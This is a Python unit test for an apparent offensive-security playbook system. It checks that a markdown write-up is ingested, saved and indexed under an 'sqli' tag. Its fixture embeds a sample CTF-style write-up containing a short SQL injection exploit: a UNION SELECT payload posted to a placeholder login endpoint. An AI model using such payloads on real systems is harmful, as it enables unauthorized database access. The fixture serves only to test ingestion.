import unittest
import os
import tempfile
import sys

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "..")))

from backend.knowledge.ingest_writeup import ingest_file
from backend.knowledge.playbook_vault import playbook_vault

class TestIngestWriteup(unittest.TestCase):

    def test_ingest_markdown_writeup(self):
        sample_md = """# SQL Injection Bypass Writeup

## Vulnerability Analysis
The target application is vulnerable to error-based SQL injection in the username parameter.

## Exploit Code
```python
import requests
url = "http://target.local:8080/login"
payload = "' UNION SELECT 1, group_concat(flag) FROM flags --"
res = requests.post(url, data={"username": payload})
print(res.text)
```
"""
        with tempfile.NamedTemporaryFile("w", suffix=".md", delete=False, encoding="utf-8") as f:
            f.write(sample_md)
            temp_path = f.name

        saved_path = None
        try:
            saved_path = ingest_file(temp_path, category="web", title="Error-Based SQLi Test")
            self.assertTrue(os.path.exists(saved_path))
            
            # Verify indexed in vault
            results = playbook_vault.search_playbooks("SQL injection", category="web")
            self.assertTrue(len(results) > 0)
            self.assertIn("sqli", results[0].tags)
        finally:
            if os.path.exists(temp_path):
                os.remove(temp_path)
            if saved_path and os.path.exists(saved_path):
                os.remove(saved_path)

if __name__ == "__main__":
    unittest.main()
